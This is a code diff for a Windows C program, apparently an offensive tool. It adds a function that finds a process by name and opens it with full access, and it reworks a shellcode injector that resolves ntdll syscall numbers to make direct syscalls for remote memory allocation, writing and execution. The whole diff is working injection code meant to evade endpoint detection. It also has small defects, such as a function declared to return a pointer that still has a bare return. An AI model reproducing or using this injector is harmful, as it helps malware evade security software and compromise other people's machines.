@@ -1,9 +1,72 @@
 #include "Box.h"
+#include "struct.h"
+
+BOOL GetRemoteProcID
+(
+	IN LPCWSTR ProcName,
+	OUT DWORD* PID,
+	OUT HANDLE* hProcess
+)
+
+{
+
+	fnNtQuerySystemInformation		pNtQuerySystemInformation = NULL;
+	ULONG							uReturnLen1 = 0, uReturnLen2 = 0;
+	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
+	PVOID							pValueToFree = NULL;
+	NTSTATUS						STATUS = 0;
+
+
+	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQuerySystemInformation");
+	if (pNtQuerySystemInformation == NULL) {
+		PRINT_ERROR("GetProcAddress");
+		return FALSE;
+	}
+
+	pNtQuerySystemInformation(SystemProcessInformation, NULL, 0, &uReturnLen1);
+
+	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
+	if (SystemProcInfo == NULL)
+	{
+		PRINT_ERROR("HeapAlloc");
+		return FALSE;
+	}
+
+	pValueToFree = SystemProcInfo;
+
+	STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
+	if (STATUS != 0x0) {
+		PRINT_ERROR("NtQuerySystemInformation");
+		return FALSE;
+	}
+
+	while (TRUE) {
+		if (SystemProcInfo->ImageName.Length && _wcsicmp(SystemProcInfo->ImageName.Buffer, ProcName) == 0)
+		{
+			*PID = (DWORD)SystemProcInfo->UniqueProcessId;
+			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *PID);
+			break;
+		}
+
+		if (!SystemProcInfo->NextEntryOffset)
+			break;
+
+		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
+
+	}
+
+	HeapFree(GetProcessHeap(), 0, pValueToFree);
+
+	if (*PID == NULL || *hProcess == NULL)
+		return FALSE;
+	else
+		return TRUE;
+}
 
 /*-------------------------------------------------------[Populate SSN]---------------------------------------------------*/
 
 
-VOID GetSSN(IN HMODULE mod, IN LPCSTR FuncName, OUT DWORD* FuncSSN)
+PVOID GetSSN(IN HMODULE mod, IN LPCSTR FuncName, OUT DWORD* FuncSSN)
 {
 
 	UINT_PTR NtFunctionAddress = 0;
@@ -11,7 +74,7 @@ VOID GetSSN(IN HMODULE mod, IN LPCSTR FuncName, OUT DWORD* FuncSSN)
 	NtFunctionAddress = (UINT_PTR)GetProcAddress(mod, FuncName);
 	if (NtFunctionAddress == 0)
 	{
-		WARN("GetProcAddress Failed! With an Error: %ld", GetLastError());
+		PRINT_ERROR("GetProcAddress");
 		return;
 	}
 
@@ -19,7 +82,7 @@ VOID GetSSN(IN HMODULE mod, IN LPCSTR FuncName, OUT DWORD* FuncSSN)
 	BYTE byte5 = ((PBYTE)NtFunctionAddress)[5];
 	*FuncSSN = (byte5 << 8) | byte4;
 
-	return;
+	return NULL;
 }
 
 
@@ -27,9 +90,10 @@ VOID GetSSN(IN HMODULE mod, IN LPCSTR FuncName, OUT DWORD* FuncSSN)
 
 
 BOOL DirectShellInjection(
-	_In_ CONST DWORD PID,
-	_In_ CONST PBYTE pShellcode,
-	_In_ CONST SIZE_T sSizeofShellcode
+	IN DWORD PID,
+	IN HANDLE hProcess,
+	IN PBYTE pShellcode,
+	IN SIZE_T sSizeofShellcode
 )
 
 {
@@ -61,7 +125,6 @@ BOOL DirectShellInjection(
 	/*-------------------------------------[Externally calling all function from DirectSyscalls.asm]-------------------------------------------------------*/
 
 
-	GetSSN(NtdllHandle, "NtOpenProcess", &g_NtOpenProcessSSN);
 	GetSSN(NtdllHandle, "NtAllocateVirtualMemory", &g_NtAllocateVirtualMemorySSN);
 	GetSSN(NtdllHandle, "NtWriteVirtualMemory", &g_NtWriteVirtualMemorySSN);
 	GetSSN(NtdllHandle, "NtProtectVirtualMemory", &g_NtProtectVirtualMemorySSN);
@@ -69,13 +132,6 @@ BOOL DirectShellInjection(
 	GetSSN(NtdllHandle, "NtWaitForSingleObject", &g_NtWaitForSingleObjectSSN);
 	GetSSN(NtdllHandle, "NtFreeVirtualMemory", &g_NtFreeVirtualMemorySSN);
 	GetSSN(NtdllHandle, "NtClose", &g_NtCloseSSN);
-
-	STATUS = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
-	if (STATUS_SUCCESS != STATUS)
-	{
-		WARN("NtOpenProcess Failed! With an Error: 0x%0.8x", STATUS);
-		State = FALSE; goto CLEANUP;
-	}
 
 	OKAY("[0x%p] Successfully Got a handle to the process: [%ld]", hProcess, PID);
 
